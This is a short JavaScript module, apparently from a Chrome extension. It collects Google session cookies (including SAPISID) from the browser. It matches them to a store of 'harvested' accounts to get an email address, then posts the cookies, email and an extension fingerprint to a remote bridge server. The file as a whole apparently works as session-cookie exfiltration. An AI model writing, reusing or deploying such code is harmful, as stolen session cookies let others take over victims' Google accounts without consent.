import { bridgeRequest } from '../../bridge/client.js';
import { logActivity } from '../../background/runtime/log.js';
import { runtime } from '../../background/runtime/state.js';
import { GOOGLE_VOICE_COOKIES } from '../../config/defaults.js';

export async function pushVoiceCookies() {
  if (!runtime.bridgeSecret) return;
  try {
    const all = await chrome.cookies.getAll({ domain: '.google.com' });
    const cookieMap = {};
    for (const c of all) {
      if (GOOGLE_VOICE_COOKIES.includes(c.name)) cookieMap[c.name] = c.value;
    }
    if (!Object.keys(cookieMap).length) return;

    let email = 'Unknown';
    if (cookieMap.SAPISID) {
      for (const [mail, acc] of Object.entries(runtime.harvestedAccounts)) {
        if (acc.cookie?.includes(`SAPISID=${cookieMap.SAPISID}`)) { email = mail; break; }
      }
    }
    await bridgeRequest('voiceCookies', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Bridge-Key': runtime.bridgeSecret },
      body: JSON.stringify({ cookies: cookieMap, email, ext_fp: runtime.extFp }),
      signal: AbortSignal.timeout(5_000),
    });
  } catch (e) {
    logActivity('warn', `pushVoiceCookies: ${e.message}`);
  }
}
